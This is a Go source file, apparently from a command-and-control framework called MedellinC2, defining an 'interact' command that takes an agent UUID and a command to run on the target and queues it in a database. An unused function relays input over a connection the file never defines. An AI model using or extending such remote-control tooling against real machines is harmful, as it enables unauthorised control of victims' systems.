/*
Copyright © 2022 NAME HERE <EMAIL ADDRESS>

*/
package cmd

import (
	"bufio"
	"fmt"
	"os"
	"strings"

	"github.com/megatop1/MedellinC2/data"
	"github.com/spf13/cobra"
)

// interactCmd represents the interact command
var interactCmd = &cobra.Command{
	Use:   "interact",
	Short: "Interact with a particular agent",
	Long:  `Interact and runs commands on a specific agent`,
	Run: func(cmd *cobra.Command, args []string) {
		uploadRemoteCommandToDB()
		/* Code to Get User Input and send over channel  */
		//sendRemoteCommand()
	},
}

//Get the command the user will send and upload it to the database
func uploadRemoteCommandToDB() {
	/* Step 1: Ask user to input agent UUID and check if its in the DB */
	var uuid string
	fmt.Print("Enter Agent UUID: ")
	fmt.Scanln(&uuid)

	data.GetAgentUUID(uuid)

	var command string
	fmt.Print("Please enter in the command you would like executed on the target: ")
	fmt.Scanln(&command)

	/* Step 2: Check if agent is alive */

	/* Step 3: Send command to the database */
	println("Uploading command to the database...")
	data.InsertCommandToAgentTableInDB(command, uuid)
}

func sendRemoteCommand() {
	for {
		reader := bufio.NewReader(os.Stdin) //Read User Input (data) using buffer io package from the connection
		fmt.Print(">> ")
		text, _ := reader.ReadString('\n')
		fmt.Fprintf(con, text+"\n")

		message, _ := bufio.NewReader(con).ReadString('\n')
		fmt.Print("->: " + message)
		if strings.TrimSpace(string(text)) == "STOP" {
			fmt.Println("TCP client exiting...")
			return
		}
	}

	//Map UID to a connection

}

func init() {
	agentCmd.AddCommand(interactCmd)
}
